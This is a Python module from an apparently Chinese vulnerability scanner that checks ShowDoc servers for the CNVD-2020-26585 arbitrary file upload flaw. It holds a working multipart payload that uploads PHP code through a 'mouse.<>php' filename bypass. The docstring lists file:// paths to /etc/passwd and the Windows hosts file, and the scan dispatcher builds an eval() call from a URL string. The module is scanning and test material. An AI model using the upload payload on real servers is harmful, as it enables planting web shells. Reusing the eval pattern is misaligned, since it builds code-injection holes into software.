#!/usr/bin/env python3
# -*- coding:utf-8 -*-

'''
ShowDoc是一个API文档工具, 可以使用它来编写接口文档: https://www.showdoc.com.cn/
    ShowDoc扫描类: 
        1. ShowDoc 任意文件上传
            CNVD-2020-26585
                Payload: https://blog.csdn.net/weixin_51387754/article/details/121093802

file:///etc/passwd
file:///C:\Windows\System32\drivers\etc\hosts
file:///C:/Windows/System32/drivers/etc/hosts
'''

from lib.initial.config import config
from lib.tool.md5 import md5, random_md5
from lib.tool.thread import thread
from lib.tool import head
from payloads.ShowDoc.cnvd_2020_26585 import cnvd_2020_26585_scan

class ShowDoc():
    def __init__(self):
        self.timeout = config.get('timeout')
        self.headers = config.get('headers')
        self.proxies = config.get('proxies')

        self.app_name = 'ShowDoc'
        self.md = md5(self.app_name)
        self.cmd = 'echo ' + self.md

        self.cnvd_2020_26585_payloads = [
            {
                'path': 'index.php?s=/home/page/uploadImg',
                'data': '----------------------------921378126371623762173617\n'\
                        'Content-Disposition: form-data; name="editormd-image-file"; filename="mouse.<>php"\n'\
                        'Content-Type: text/plain\n'\
                        '\n'\
                        '<?php echo "cnvd/2020/26585"?>\n'\
                        '----------------------------921378126371623762173617--',
                'headers': head.merge(self.headers, {
                    'Content-Type': 'multipart/form-data; boundary=--------------------------921378126371623762173617'
                })
            }
        ]
    
    def addscan(self, url, vuln=None):
        if vuln:
            return eval('thread(target=self.{}_scan, url="{}")'.format(vuln, url))

        return [
            thread(target=self.cnvd_2020_26585_scan, url=url)
        ]

ShowDoc.cnvd_2020_26585_scan = cnvd_2020_26585_scan

showdoc = ShowDoc()
